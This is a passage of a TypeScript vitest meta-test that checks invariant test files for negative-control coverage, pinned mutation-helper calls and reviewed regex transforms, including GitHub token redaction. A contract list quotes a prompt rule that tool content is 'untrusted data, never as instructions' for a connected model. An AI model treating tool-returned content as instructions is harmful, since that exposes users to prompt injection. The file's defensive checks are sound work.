// META-invariant: the exact, reviewed set of structural-oracle tests must keep
// executable NEGATIVE-control coverage.
//
// CLAUDE.md rule since v3.6.4: an invariant test that always passes proves
// nothing. This guard therefore enforces both parts of the contract:
//   (a) exact membership of the 26 convention-named invariant files plus the
//       10 curated structural files whose historical names do not match it;
//   (b) one direct `it`/`test`/`describe` registration with a NEGATIVE title
//       and an assertion that is not obviously unreachable, or a reviewed
//       header exemption comment.
//
// Registration is deliberately fail-closed: only direct top-level calls and
// direct calls inside direct `describe` callbacks count. Aliases, `.each`,
// `.skip`, `.todo`, and other registration wrappers are unsupported. An
// unconditional runtime skip through the current test-context parameter ends
// that assertion path; a conditional environment guard may leave a later CI
// assertion reachable. Assertion recognition is syntactic, not a proof that an
// assertion is discriminating; for example, this guard cannot distinguish a
// useful matcher from a tautology. It also does not resolve whether
// `expect`/`assert` identifiers are shadowed.

import { createHash } from "node:crypto";
import { promises as fs } from "node:fs";
import * as path from "node:path";
import ts from "typescript";
import { beforeAll, describe, expect, it } from "vitest";
import { replaceAllExactly, replaceExactly, replaceIntegerAllExactly } from "./helpers/exact-source-mutation.js";
import {
  createReleaseMutationIdentityAuditor,
  observeReleaseMutationTransitionMatrix,
  releaseMutationIdentityAuditProblems
} from "./release-mutation-identity-audit.js";
import { releaseMutationVersionedTransitionAuditProblems } from "./release-mutation-transition-audit.js";

const repoRoot = path.resolve(__dirname, "..");
const RELEASE_MUTATION_IDENTITY_FIXTURE_SHA256 = "8205d24e6d42dd4cb8986368611514131abe701434beb30150e33ea08f4b1288";
const RELEASE_MUTATION_TRANSITION_FIXTURE_SHA256 = "d2110f2e61b269db85bd43cbe718c8c7758c7518164bf756efa8906dfb06fe0c";
const releaseMutationIdentityFixturePath = path.join(repoRoot, "tests/fixtures/release-mutation-identity.v2.json");
const releaseMutationTransitionFixturePath = path.join(repoRoot, "tests/fixtures/release-mutation-transition.v3.json");
const releaseIntegritySourcePath = path.join(repoRoot, "tests/release-integrity.test.ts");

interface MutableIdentityControlManifest {
  readonly cases: Array<{
    readonly checks: Array<{
      readonly expectation: { regex?: string };
      readonly invoke: {
        readonly inputs: {
          readonly arguments: Array<{ readonly id?: string; readonly kind: string; readonly slot: string }>;
          callee: string;
        };
        kind: string;
      };
    }>;
  }>;
  readonly mutations: Array<{
    readonly id: string;
    readonly expressions: {
      readonly needle: { raw: string; resolved: string };
      readonly source: { resolved: string };
    };
    replacementDependency: string | null;
  }>;
  readonly sources: Array<{
    contentSha256: string;
    readonly declarativeBinding: string;
    readonly id: string;
    readonly legacyExpressions: string[];
    readonly order: number;
    readonly origin: unknown;
    semanticFingerprint: string;
  }>;
}

type MutableIdentityControlCheck = MutableIdentityControlManifest["cases"][number]["checks"][number];

function identityControlCheck(manifest: MutableIdentityControlManifest, kind: string): MutableIdentityControlCheck {
  const check = manifest.cases
    .flatMap((identityCase) => identityCase.checks)
    .find((entry) => entry.invoke.kind === kind);
  if (check === undefined) throw new Error(`release identity fixture has no ${kind} invocation`);
  return check;
}

function sha256Text(value: string): string {
  return createHash("sha256").update(value).digest("hex");
}

function diagnosticMultisetDifference(candidate: readonly string[], baseline: readonly string[]): string[] {
  const remainingBaseline = new Map<string, number>();
  for (const problem of baseline) {
    remainingBaseline.set(problem, (remainingBaseline.get(problem) ?? 0) + 1);
  }
  return candidate.filter((problem) => {
    const remaining = remainingBaseline.get(problem) ?? 0;
    if (remaining === 0) return true;
    remainingBaseline.set(problem, remaining - 1);
    return false;
  });
}

function firstIdentityEntry<T>(values: readonly T[], label: string): T {
  const value = values[0];
  if (value === undefined) throw new Error(`release identity fixture has no ${label}`);
  return value;
}

// Freeze the convention-named side too: a one-for-one delete/add swap must not
// evade review merely because the aggregate count remains unchanged.
const EXPECTED_NAMED_STRUCTURAL_FILES = [
  "abs-path-leak-invariant.test.ts",
  "cache-isolation-invariant.test.ts",
  "cli-flag-docs-invariant.test.ts",
  "docker-glama-invariant.test.ts",
  "enforcement-guard-invariant.test.ts",
  "entrypoint-guard-invariant.test.ts",
  "erasure-invariant.test.ts",
  "fence-toggle-invariant.test.ts",
  "github-metadata-invariant.test.ts",
  "k1-ast-invariant.test.ts",
  "k1-class-invariant.test.ts",
  "k3-readonly-hint-invariant.test.ts",
  "module-header-claim-invariant.test.ts",
  "name-fold-invariant.test.ts",
  "no-graymatter-invariant.test.ts",
  "optional-dep-leak-invariant.test.ts",
  "parser-desync-invariant.test.ts",
  "parser-input-cap-invariant.test.ts",
  "phantom-import-invariant.test.ts",
  "readme-anchor-invariant.test.ts",
  "resource-bound-invariant.test.ts",
  "scope-completeness-invariant.test.ts",
  "sink-parity-invariant.test.ts",
  "smoke-default-vault-invariant.test.ts",
  "workflow-privilege-invariant.test.ts",
  "write-lifecycle-invariant.test.ts"
] as const;

// Historical structural tests that do not use the `*-invariant.test.ts` suffix
// are curated explicitly so they cannot dodge the same coverage rule.
const EXTRA_STRUCTURAL_FILES = [
  "docs-consistency.test.ts",
  "cli-parity.test.ts",
  "lint.test.ts",
  "no-internal-imports.test.ts",
  "meta-invariant-coverage.test.ts",
  "mcp-schema-compat.test.ts",
  // release-integrity is a structural oracle despite its historical filename.
  // Its mutation controls belong under the same fail-closed meta-guard.
  "release-integrity.test.ts",
  // The versioned release-mutation authority is structural despite its
  // historical filename and must share both NEGATIVE-control and raw-mutation
  // coverage with the invariant-suffixed files.
  "release-mutation-transition.test.ts",
  // v3.9.0-rc.26 (rc.25-audit LOW-1) — two more invariant-SHAPED tests that
  // assert source/state against a canonical value but aren't named
  // `*-invariant.test.ts`, so they escaped the glob. Both already carry a real
  // NEGATIVE control (k1-version-stamp drives `scanK1Stamps` on a bad fixture;
  // jsonld has an empty-answer control) — listing them keeps the meta-invariant
  // watching that those controls don't rot.
  "k1-version-stamp-consistency.test.ts",
  "jsonld.test.ts"
] as const;
const EXPECTED_STRUCTURAL_FILES = [...EXPECTED_NAMED_STRUCTURAL_FILES, ...EXTRA_STRUCTURAL_FILES] as const;
const EXPECTED_STRUCTURAL_FILE_COUNT = EXPECTED_STRUCTURAL_FILES.length;

// Derive the raw-mutation census from the structural census. A newly added
// invariant can no longer fall outside this oracle because somebody forgot a
// second, parallel filename list. The shared helper is included separately so
// its implementation cannot quietly regress to the primitive it replaces.
const RAW_REPLACE_INVENTORY_FILES = [...EXPECTED_STRUCTURAL_FILES, "helpers/exact-source-mutation.ts"] as const;

interface ExactMutationHelperCallIdentity {
  readonly helper: "replaceExactly" | "replaceAllExactly" | "replaceIntegerAllExactly";
  readonly label: string;
  readonly needle: string;
  readonly replacement: string;
  readonly sourceIdentifier: string;
}

// AH-3 adds two fail-closed mutations around the shared write core. Keep their
// exact call identities beside the census so an unrelated helper call cannot
// compensate for deleting either delegate control while preserving the total.
const ABS_PATH_SHARED_WRITE_DELEGATE_MUTATIONS = [
  {
    helper: "replaceExactly",
    label: "writeNote shared-write-core delegate",
    needle: "return this.writeNoteContent(relPath, content, opts);",
    replacement: "return this.writeNoteContent(relPath, content, { overwrite: false });",
    sourceIdentifier: "realVault"
  },
  {
    helper: "replaceExactly",
    label: "binary rollback forced-overwrite delegate",
    needle: "return this.writeNoteContent(relPath, content, { overwrite: true });",
    replacement: "return this.writeNoteContent(relPath, content, { overwrite: false });",
    sourceIdentifier: "realVault"
  }
] as const satisfies readonly ExactMutationHelperCallIdentity[];

// These three controls used raw String.replace before the repository oracle
// was widened. Pin their exact helper identities so a same-count unrelated
// helper call cannot hide removal of the converted negative control.
const DOCS_CONSISTENCY_CONVERTED_RAW_MUTATIONS = [
  {
    helper: "replaceExactly",
    label: "coverage artifact action pin mutation",
    needle: "actions/download-artifact@3e5f45b2cfb9172054b4087a40e8e0b5a5461e7c",
    replacement: "actions/download-artifact@v8",
    sourceIdentifier: "downloadBlock"
  },
  {
    helper: "replaceExactly",
    label: "required CI inventory row mutation",
    needle: "2. `docker`",
    replacement: "2. `smoke`",
    sourceIdentifier: "exactInventory"
  },
  {
    helper: "replaceExactly",
    label: "unprotected CI inventory mutation",
    needle: "- `test-macos` is advisory.",
    replacement: "- `docker` is not branch-protected.",
    sourceIdentifier: "exactInventory"
  }
] as const satisfies readonly ExactMutationHelperCallIdentity[];

interface ExpectedMutationHelperCallCensus {
  readonly count: number;
  readonly sha256: string;
}

const EXPECTED_REPOSITORY_MUTATION_HELPER_CALL_ENTRIES = [
  // Seven pre-AH-3 controls plus the two exact shared-write delegate controls above.
  [
    "abs-path-leak-invariant.test.ts",
    { count: 7 + ABS_PATH_SHARED_WRITE_DELEGATE_MUTATIONS.length, sha256: "0000000000000000000000000000000000000000000000000000000000000000" }
  ],
  ["cli-parity.test.ts", { count: 6, sha256: "0000000000000000000000000000000000000000000000000000000000000000" }],
  ["docker-glama-invariant.test.ts", { count: 1, sha256: "0000000000000000000000000000000000000000000000000000000000000000" }],
  ["docs-consistency.test.ts", { count: 53, sha256: "0000000000000000000000000000000000000000000000000000000000000000" }],
  ["enforcement-guard-invariant.test.ts", { count: 41, sha256: "0000000000000000000000000000000000000000000000000000000000000000" }],
  ["erasure-invariant.test.ts", { count: 104, sha256: "0000000000000000000000000000000000000000000000000000000000000000" }],
  ["k1-ast-invariant.test.ts", { count: 4, sha256: "0000000000000000000000000000000000000000000000000000000000000000" }],
  ["k1-class-invariant.test.ts", { count: 102, sha256: "0000000000000000000000000000000000000000000000000000000000000000" }],
  ["meta-invariant-coverage.test.ts", { count: 0, sha256: "0000000000000000000000000000000000000000000000000000000000000000" }],
  ["no-internal-imports.test.ts", { count: 76, sha256: "0000000000000000000000000000000000000000000000000000000000000000" }],
  ["release-mutation-transition.test.ts", { count: 10, sha256: "0000000000000000000000000000000000000000000000000000000000000000" }],
  ["resource-bound-invariant.test.ts", { count: 1, sha256: "0000000000000000000000000000000000000000000000000000000000000000" }],
  ["sink-parity-invariant.test.ts", { count: 1, sha256: "0000000000000000000000000000000000000000000000000000000000000000" }],
  ["smoke-default-vault-invariant.test.ts", { count: 1, sha256: "0000000000000000000000000000000000000000000000000000000000000000" }],
  ["write-lifecycle-invariant.test.ts", { count: 20, sha256: "0000000000000000000000000000000000000000000000000000000000000000" }]
] as const satisfies readonly (readonly [string, ExpectedMutationHelperCallCensus])[];
const EXPECTED_REPOSITORY_MUTATION_HELPER_CALLS = new Map<string, ExpectedMutationHelperCallCensus>(
  EXPECTED_REPOSITORY_MUTATION_HELPER_CALL_ENTRIES
);
const EXPECTED_REPOSITORY_MUTATION_HELPER_IMPORT_ENTRIES = [
  ["abs-path-leak-invariant.test.ts", ["replaceExactly"]],
  ["cli-parity.test.ts", ["replaceExactly"]],
  ["docker-glama-invariant.test.ts", ["replaceExactly"]],
  ["docs-consistency.test.ts", ["replaceAllExactly", "replaceExactly", "replaceIntegerAllExactly"]],
  ["enforcement-guard-invariant.test.ts", ["replaceAllExactly", "replaceExactly"]],
  ["erasure-invariant.test.ts", ["replaceExactly"]],
  ["k1-ast-invariant.test.ts", ["replaceExactly"]],
  ["k1-class-invariant.test.ts", ["replaceAllExactly", "replaceExactly"]],
  ["meta-invariant-coverage.test.ts", ["replaceAllExactly", "replaceExactly", "replaceIntegerAllExactly"]],
  ["no-internal-imports.test.ts", ["replaceExactly"]],
  ["release-mutation-transition.test.ts", ["replaceExactly"]],
  ["resource-bound-invariant.test.ts", ["replaceExactly"]],
  ["sink-parity-invariant.test.ts", ["replaceExactly"]],
  ["smoke-default-vault-invariant.test.ts", ["replaceExactly"]],
  ["write-lifecycle-invariant.test.ts", ["replaceExactly"]]
] as const satisfies readonly (readonly [string, readonly string[]])[];
const EXPECTED_REPOSITORY_MUTATION_HELPER_IMPORTS = new Map<string, readonly string[]>(
  EXPECTED_REPOSITORY_MUTATION_HELPER_IMPORT_ENTRIES
);
const EXACT_MUTATION_HELPERS = new Set(["replaceExactly", "replaceAllExactly", "replaceIntegerAllExactly"]);

/** Report repeated tuple keys before Map construction can silently last-win. */
function duplicateStringEntryKeys(entries: readonly (readonly [string, unknown])[]): string[] {
  const seen = new Set<string>();
  const duplicates = new Set<string>();
  for (const [key] of entries) {
    if (seen.has(key)) duplicates.add(key);
    seen.add(key);
  }
  return [...duplicates].sort();
}

/** Report tuple keys that are not members of their authoritative source census. */
function entryKeysOutside(
  entries: readonly (readonly [string, unknown])[],
  allowed: ReadonlySet<string>
): string[] {
  return entries.map(([key]) => key).filter((key) => !allowed.has(key)).sort();
}

/** Require every reviewed ordinary transform to name the owner whose complete file is frozen. */
function ownerlessReviewedTransformIds(
  entries: readonly { readonly filename: string; readonly id: string; readonly owner?: string }[]
): string[] {
  return entries
    .filter((entry) => entry.owner === undefined)
    .map((entry) => entry.id)
    .sort();
}

/** Require a deliberate list edit for every structural-oracle addition, removal, or rename. */
function assertStructuralFileMembership(actual: ReadonlySet<string>): void {
  const expected = new Set<string>(EXPECTED_STRUCTURAL_FILES);
  const missing = EXPECTED_STRUCTURAL_FILES.filter((name) => !actual.has(name));
  const unexpected = [...actual].filter((name) => !expected.has(name)).sort();
  if (missing.length === 0 && unexpected.length === 0) return;

  const details: string[] = [];
  if (missing.length > 0) details.push(`missing: ${missing.join(", ")}`);
  if (unexpected.length > 0) details.push(`unexpected: ${unexpected.join(", ")}`);
  throw new Error(`structural invariant census mismatch (${details.join("; ")})`);
}

/** Unwrap syntax that cannot change the static identity of a property access. */
function unwrapStaticExpression(node: ts.Expression): ts.Expression {
  let current = node;
  while (
    ts.isParenthesizedExpression(current) ||
    ts.isAsExpression(current) ||
    ts.isTypeAssertionExpression(current) ||
    ts.isNonNullExpression(current) ||
    ts.isSatisfiesExpression(current)
  ) {
    current = current.expression;
  }
  return current;
}

/** Resolve only literal property spellings; dynamic properties remain unclassified. */
function staticPropertyText(node: ts.Node | undefined): string | null {
  let current = node;
  while (current) {
    if (ts.isComputedPropertyName(current)) current = current.expression;
    else if (
      ts.isParenthesizedExpression(current) ||
      ts.isAsExpression(current) ||
      ts.isTypeAssertionExpression(current) ||
      ts.isNonNullExpression(current) ||
      ts.isSatisfiesExpression(current)
    ) {
      current = current.expression;
    } else break;
  }
  if (current === undefined) return null;
  if (ts.isIdentifier(current) || ts.isStringLiteralLike(current)) return current.text;
  if (ts.isBinaryExpression(current) && current.operatorToken.kind === ts.SyntaxKind.PlusToken) {
    const left = staticStringExpressionText(current.left);
    const right = staticStringExpressionText(current.right);
    return left === null || right === null ? null : left + right;
  }
  return null;
}

/** Fold only literal string concatenation used as a computed property name. */
function staticStringExpressionText(node: ts.Expression): string | null {
  const current = unwrapStaticExpression(node);
  if (ts.isStringLiteralLike(current)) return current.text;
  if (ts.isBinaryExpression(current) && current.operatorToken.kind === ts.SyntaxKind.PlusToken) {
    const left = staticStringExpressionText(current.left);
    const right = staticStringExpressionText(current.right);
    return left === null || right === null ? null : left + right;
  }
  return null;
}

/** Type queries mention String APIs without creating an executable mutation sink. */
function isTypeOnlyAccess(node: ts.Node): boolean {
  let current: ts.Node | undefined = node.parent;
  while (current) {
    if (ts.isTypeQueryNode(current)) return true;
    current = current.parent;
  }
  return false;
}

/** True when an object-literal property belongs to the left side of an assignment pattern. */
function isDestructuringAssignmentProperty(node: ts.PropertyAssignment | ts.ShorthandPropertyAssignment): boolean {
  let current: ts.Node = node;
  while (current.parent) {
    const parent = current.parent;
    if (ts.isBinaryExpression(parent) && parent.operatorToken.kind === ts.SyntaxKind.EqualsToken) {
      return current.getStart() >= parent.left.getStart() && current.getEnd() <= parent.left.getEnd();
    }
    if (ts.isForOfStatement(parent) || ts.isForInStatement(parent)) {
      return current.getStart() >= parent.initializer.getStart() && current.getEnd() <= parent.initializer.getEnd();
    }
    if (ts.isStatement(parent) || ts.isFunctionLike(parent)) return false;
    current = parent;
  }
  return false;
}

const REVIEWED_ORDINARY_TRANSFORMS = [
  {
    binding: "normalizedQuotes",
    filename: "docs-consistency.test.ts",
    id: "pdf OCR quote normalization",
    method: "replace",
    owner: "function:normalize",
    pattern: "/[\"'`]/g",
    receiverRoot: "text",
    replacement: '""'
  },
  {
    binding: "normalizedWhitespace",
    filename: "docs-consistency.test.ts",
    id: "pdf OCR whitespace normalization",
    method: "replace",
    owner: "function:normalize",
    pattern: "/\\s+/g",
    receiverRoot: "normalizedQuotes",
    replacement: '" "'
  },
  {
    binding: "normalizedLifecycle",
    filename: "docs-consistency.test.ts",
    id: "lifecycle whitespace normalization",
    method: "replace",
    owner: "test:README, ROADMAP, and recipe prompt claims match the actual prompt contract",
    pattern: "/\\s+/g",
    receiverRoot: "lifecycle",
    replacement: '" "'
  },
  {
    binding: "unescapedGate",
    filename: "docs-consistency.test.ts",
    id: "release gate parenthesis unescape",
    method: "replace",
    owner: "function:requiredCiGates",
    pattern: "/\\\\([()])/g",
    receiverRoot: "gate",
    replacement: '"$1"'
  },
  {
    filename: "entrypoint-guard-invariant.test.ts",
    id: "entrypoint block-comment stripping",
    method: "replace",
    owner: "function:stripComments",
    pattern: String.raw`/\/\*[\s\S]*?\*\//g`,
    receiverRoot: "src",
    replacement: '""'
  },
  {
    filename: "entrypoint-guard-invariant.test.ts",
    id: "entrypoint line-comment stripping",
    method: "replace",
    owner: "function:stripComments",
    pattern: String.raw`/(^|[^:])\/\/[^\n]*/g`,
    receiverRoot: "src",
    replacement: '"$1"'
  },
  {
    filename: "docker-glama-invariant.test.ts",
    id: "release-check open-parenthesis unescape",
    method: "replaceAll",
    owner: "function:releasePlatformGateProblems",
    pattern: String.raw`"\\("`,
    receiverRoot: "name",
    replacement: '"("'
  },
  {
    filename: "docker-glama-invariant.test.ts",
    id: "release-check close-parenthesis unescape",
    method: "replaceAll",
    owner: "function:releasePlatformGateProblems",
    pattern: String.raw`"\\)"`,
    receiverRoot: "name",
    replacement: '")"'
  },
  {
    filename: "docker-glama-invariant.test.ts",
    id: "Docker COPY prefix stripping",
    method: "replace",
    owner: "function:analyzeDockerfile",
    pattern: String.raw`/^\s*COPY\s+/i`,
    receiverRoot: "line",
    replacement: '""'
  },
  {
    filename: "docker-glama-invariant.test.ts",
    id: "Docker local COPY dot-prefix stripping",
    method: "replace",
    owner: "function:analyzeDockerfile",
    pattern: String.raw`/^\.\//u`,
    receiverRoot: "source",
    replacement: '""'
  },
  {
    filename: "docker-glama-invariant.test.ts",
    id: "Docker local COPY slash-suffix stripping",
    method: "replace",
    owner: "function:analyzeDockerfile",
    pattern: String.raw`/\/$/u`,
    receiverRoot: "source",
    replacement: '""'
  },
  {
    filename: "fence-toggle-invariant.test.ts",
    id: "fence block-comment stripping",
    method: "replace",
    owner: "function:stripComments",
    pattern: String.raw`/\/\*[\s\S]*?\*\//g`,
    receiverRoot: "src",
    replacement: '""'
  },
  {
    filename: "fence-toggle-invariant.test.ts",
    id: "fence line-comment stripping",
    method: "replace",
    owner: "function:stripComments",
    pattern: String.raw`/\/\/[^\n]*/g`,
    receiverRoot: "src",
    replacement: '""'
  },
  {
    filename: "github-metadata-invariant.test.ts",
    id: "GitHub response CRLF normalization",
    method: "replace",
    owner: "function:parseIncludedResponse",
    pattern: String.raw`/\r\n/g`,
    receiverRoot: "stdout",
    replacement: '"\\n"'
  },
  {
    filename: "github-metadata-invariant.test.ts",
    id: "GitHub token-shape redaction",
    method: "replace",
    owner: "function:sanitizeGhDetail",
    pattern: String.raw`/\b(?:github_pat_[A-Za-z0-9_]+|gh[pousr]_[A-Za-z0-9_]+)\b/g`,
    receiverRoot: "detail",
    replacement: '"[REDACTED]"'
  },
  {
    filename: "github-metadata-invariant.test.ts",
    id: "GitHub environment-token redaction",
    method: "replace",
    owner: "function:sanitizeGhDetail",
    pattern: String.raw`/\b((?:GH|GITHUB)_TOKEN)\s*=\s*\S+/gi`,
    receiverRoot: "detail",
    replacement: '"$1=[REDACTED]"'
  },
  {
    filename: "github-metadata-invariant.test.ts",
    id: "GitHub authorization-header redaction",
    method: "replace",
    owner: "function:sanitizeGhDetail",
    pattern: String.raw`/\b(authorization:\s*(?:bearer|token))\s+\S+/gi`,
    receiverRoot: "detail",
    replacement: '"$1 [REDACTED]"'
  },
  {
    filename: "github-metadata-invariant.test.ts",
    id: "GitHub diagnostic whitespace compaction",
    method: "replace",
    owner: "function:sanitizeGhDetail",
    pattern: String.raw`/\s+/g`,
    receiverRoot: "detail",
    replacement: '" "'
  },
  {
    filename: "erasure-invariant.test.ts",
    id: "erasure source-path separator normalization",
    method: "replace",
    owner: "function:walk",
    pattern: String.raw`/\\/gu`,
    receiverRoot: "path",
    replacement: '"/"'
  },
  {
    filename: "erasure-invariant.test.ts",
    id: "SQLite positive-shape label normalization",
    method: "replaceAll",
    owner: "test:SQLite preflight admits a $shape family",
    pattern: String.raw`/[^a-z]+/gi`,
    receiverRoot: "shape",
    replacement: '"-"'
  },
  {
    filename: "erasure-invariant.test.ts",
    id: "SQLite suffix label normalization",
    method: "replace",
    owner: "test:SQLite preflight rejects a $hazard $suffix leaf without changing it",
    pattern: '"-"',
    receiverRoot: "suffixLabel",
    replacement: '""'
  },
  {
    filename: "erasure-invariant.test.ts",
    id: "sensitive-reader kind label normalization",
    method: "replaceAll",
    owner: "test:sensitive reader enforces the $kind leaf contract",
    pattern: '" "',
    receiverRoot: "kind",
    replacement: '"-"'
  },
  {
    filename: "erasure-invariant.test.ts",
    id: "sensitive-reader growth label normalization",
    method: "replaceAll",
    owner: "test:sensitive reader bounds a generation that grows $growth",
    pattern: '" "',
    receiverRoot: "growth",
    replacement: '"-"'
  },
  {
    filename: "erasure-invariant.test.ts",
    id: "publisher kind label normalization",
    method: "replaceAll",
    owner: "test:publisher admits a $kind final leaf",
    pattern: '" "',
    receiverRoot: "kind",
    replacement: '"-"'
  },
  {
    filename: "erasure-invariant.test.ts",
    id: "hardlink route label normalization",
    method: "replaceAll",
    owner: "test:distinct folded hardlinks to one symlink cannot authorize the $route",
    pattern: '" "',
    receiverRoot: "route",
    replacement: '"-"'
  },
  {
    filename: "k1-class-invariant.test.ts",
    id: "K-1 statement semicolon normalization",
    method: "replace",
    owner: "function:boundRefusalBranch",
    pattern: String.raw`/;$/u`,
    receiverRoot: "statement",
    replacement: '""'
  },
  {
    filename: "k1-class-invariant.test.ts",
    id: "K-1 block-comment stripping",
    method: "replace",
    owner: "function:withoutComments",
    pattern: String.raw`/\/\*[\s\S]*?\*\//g`,
    receiverRoot: "source",
    replacement: '""'
  },
  {
    filename: "k1-class-invariant.test.ts",
    id: "K-1 line-comment stripping",
    method: "replace",
    owner: "function:withoutComments",
    pattern: String.raw`/^\s*\/\/.*$/gm`,
    receiverRoot: "source",
    replacement: '""'
  },
  {
    filename: "k1-ast-invariant.test.ts",
    id: "K-1 module-extension normalization",
    method: "replace",
    owner: "function:isAuthorityModuleSpecifier",
    pattern: String.raw`/\.[cm]?[jt]s$/`,
    receiverRoot: "path",
    replacement: '""'
  },
  {
    filename: "k1-ast-invariant.test.ts",
    id: "K-1 source-path separator normalization",
    method: "replaceAll",
    owner: "function:isReviewedSafeClearOnlySite",
    pattern: String.raw`"\\"`,
    receiverRoot: "filePath",
    replacement: '"/"'
  }
] as const;

type ReviewedOrdinaryTransformId = (typeof REVIEWED_ORDINARY_TRANSFORMS)[number]["id"];

// These are captured from the exact live function/test callback that consumes
// each permitted non-mutating transform. The digest includes owner identity and
// the complete source file, so a reachable decoy, relocated clone, or severed
// helper consumer cannot inherit authority from the same filename/title/count.
const EXPECTED_REVIEWED_ORDINARY_OWNER_SHA256_ENTRIES = [
  ["pdf OCR quote normalization", "0000000000000000000000000000000000000000000000000000000000000000"],
  ["pdf OCR whitespace normalization", "0000000000000000000000000000000000000000000000000000000000000000"],
  ["lifecycle whitespace normalization", "0000000000000000000000000000000000000000000000000000000000000000"],
  ["release gate parenthesis unescape", "0000000000000000000000000000000000000000000000000000000000000000"],
  ["entrypoint block-comment stripping", "0000000000000000000000000000000000000000000000000000000000000000"],
  ["entrypoint line-comment stripping", "0000000000000000000000000000000000000000000000000000000000000000"],
  ["release-check open-parenthesis unescape", "0000000000000000000000000000000000000000000000000000000000000000"],
  ["release-check close-parenthesis unescape", "0000000000000000000000000000000000000000000000000000000000000000"],
  ["Docker COPY prefix stripping", "0000000000000000000000000000000000000000000000000000000000000000"],
  ["Docker local COPY dot-prefix stripping", "0000000000000000000000000000000000000000000000000000000000000000"],
  ["Docker local COPY slash-suffix stripping", "0000000000000000000000000000000000000000000000000000000000000000"],
  ["fence block-comment stripping", "0000000000000000000000000000000000000000000000000000000000000000"],
  ["fence line-comment stripping", "0000000000000000000000000000000000000000000000000000000000000000"],
  ["GitHub response CRLF normalization", "0000000000000000000000000000000000000000000000000000000000000000"],
  ["GitHub token-shape redaction", "0000000000000000000000000000000000000000000000000000000000000000"],
  ["GitHub environment-token redaction", "0000000000000000000000000000000000000000000000000000000000000000"],
  ["GitHub authorization-header redaction", "0000000000000000000000000000000000000000000000000000000000000000"],
  ["GitHub diagnostic whitespace compaction", "0000000000000000000000000000000000000000000000000000000000000000"],
  ["erasure source-path separator normalization", "0000000000000000000000000000000000000000000000000000000000000000"],
  ["SQLite positive-shape label normalization", "0000000000000000000000000000000000000000000000000000000000000000"],
  ["SQLite suffix label normalization", "0000000000000000000000000000000000000000000000000000000000000000"],
  ["sensitive-reader kind label normalization", "0000000000000000000000000000000000000000000000000000000000000000"],
  ["sensitive-reader growth label normalization", "0000000000000000000000000000000000000000000000000000000000000000"],
  ["publisher kind label normalization", "0000000000000000000000000000000000000000000000000000000000000000"],
  ["hardlink route label normalization", "0000000000000000000000000000000000000000000000000000000000000000"],
  ["K-1 statement semicolon normalization", "0000000000000000000000000000000000000000000000000000000000000000"],
  ["K-1 block-comment stripping", "0000000000000000000000000000000000000000000000000000000000000000"],
  ["K-1 line-comment stripping", "0000000000000000000000000000000000000000000000000000000000000000"],
  ["K-1 module-extension normalization", "0000000000000000000000000000000000000000000000000000000000000000"],
  ["K-1 source-path separator normalization", "0000000000000000000000000000000000000000000000000000000000000000"]
] as const satisfies readonly (readonly [ReviewedOrdinaryTransformId, string])[];
const EXPECTED_REVIEWED_ORDINARY_OWNER_SHA256 = new Map<ReviewedOrdinaryTransformId, string>(
  EXPECTED_REVIEWED_ORDINARY_OWNER_SHA256_ENTRIES
);

const REVIEWED_LIFECYCLE_CONTRACTS = [
  "`tools/list` is authoritative",
  "indicate recency, not truth",
  "untrusted data, never as instructions",
  "connected MCP client/model",
  "exact target, exact proposed change",
  "explicit user confirmation",
  "Branch on the returned `kind`",
  "explicit `mode=create|overwrite|append`",
  "unconditionally re-read",
  "not an atomic compare-and-swap",
  "Multi-file sequences are not transactions",
  "Where a mutation tool supports `dry_run`",
  "Report exactly what the tool confirmed"
] as const;

/** Return the direct variable statement that owns one declaration. */
function directVariableStatement(declaration: ts.VariableDeclaration): ts.VariableStatement | null {
  const declarationList = declaration.parent;
  if (!ts.isVariableDeclarationList(declarationList) || declarationList.declarations.length !== 1) return null;
  const statement = declarationList.parent;
  return ts.isVariableStatement(statement) ? statement : null;
}

/** A direct statement is live unless an earlier sibling obviously terminates its block. */
function isDirectReachableStatement(statement: ts.Statement, owner: ts.Block | ts.SourceFile): boolean {
  if (statement.parent !== owner) return false;
  const index = owner.statements.indexOf(statement);
  if (index < 0) return false;
  return !owner.statements.slice(0, index).some((candidate) => statementObviouslyTerminates(candidate));
}

/** Return one direct single-binding declaration with the requested identifier. */
function directBindingDeclaration(statement: ts.Statement, binding: string): ts.VariableDeclaration | null {
  if (!ts.isVariableStatement(statement) || statement.declarationList.declarations.length !== 1) return null;
  const declaration = statement.declarationList.declarations[0];
  return declaration !== undefined && ts.isIdentifier(declaration.name) && declaration.name.text === binding
    ? declaration
    : null;
}

/** Match one exact reviewed replace call without considering its owner. */
function reviewedTransformCall(
  declaration: ts.VariableDeclaration,
  receiverName: string,
  patternText: string,
  replacementText: string,
  sourceFile: ts.SourceFile
): ts.CallExpression | null {
  const initializer = declaration.initializer;
  if (
    initializer === undefined ||
    !ts.isCallExpression(initializer) ||
    initializer.arguments.length !== 2 ||
    !ts.isPropertyAccessExpression(initializer.expression) ||
    initializer.expression.name.text !== "replace"
  ) {
    return null;
  }
  const receiver = unwrapStaticExpression(initializer.expression.expression);
  const pattern = initializer.arguments[0];
  const replacement = initializer.arguments[1];
  return ts.isIdentifier(receiver) &&
    receiver.text === receiverName &&
    pattern !== undefined &&
    ts.isRegularExpressionLiteral(pattern) &&
    pattern.getText(sourceFile) === patternText &&
    replacement !== undefined &&
    ts.isStringLiteral(replacement) &&
    replacement.text === replacementText
    ? initializer
    : null;
}

/** Count identifier spellings in one exact owner subtree. */
function identifierCount(root: ts.Node, name: string): number {
  let count = 0;
  function visit(node: ts.Node): void {
    if (ts.isIdentifier(node) && node.text === name) count++;
    ts.forEachChild(node, visit);
  }
  visit(root);
  return count;
}

/** Return every identifier occurrence with one exact spelling. */
function identifiersNamed(root: ts.Node, name: string): readonly ts.Identifier[] {
  const identifiers: ts.Identifier[] = [];
  function visit(node: ts.Node): void {
    if (ts.isIdentifier(node) && node.text === name) identifiers.push(node);
    ts.forEachChild(node, visit);
  }
  visit(root);
  return identifiers;
}

/** True only for a declaration in one direct const statement. */
function isDirectConstDeclaration(declaration: ts.VariableDeclaration): boolean {
  const statement = directVariableStatement(declaration);
  return (
    statement !== null &&
    ts.isVariableDeclarationList(declaration.parent) &&
    (declaration.parent.flags & ts.NodeFlags.Const) !== 0
  );
}

/** Match a direct top-level describe callback by exact literal title. */
function isExactDirectDescribeBlock(block: ts.Block, title: string): boolean {
  const callback = block.parent;
  if ((!ts.isArrowFunction(callback) && !ts.isFunctionExpression(callback)) || callback.body !== block) return false;
  const call = callback.parent;
  if (
    !ts.isCallExpression(call) ||
    registrationName(call) !== "describe" ||
    registrationCallback(call) !== callback ||
    call.arguments[0] === undefined ||
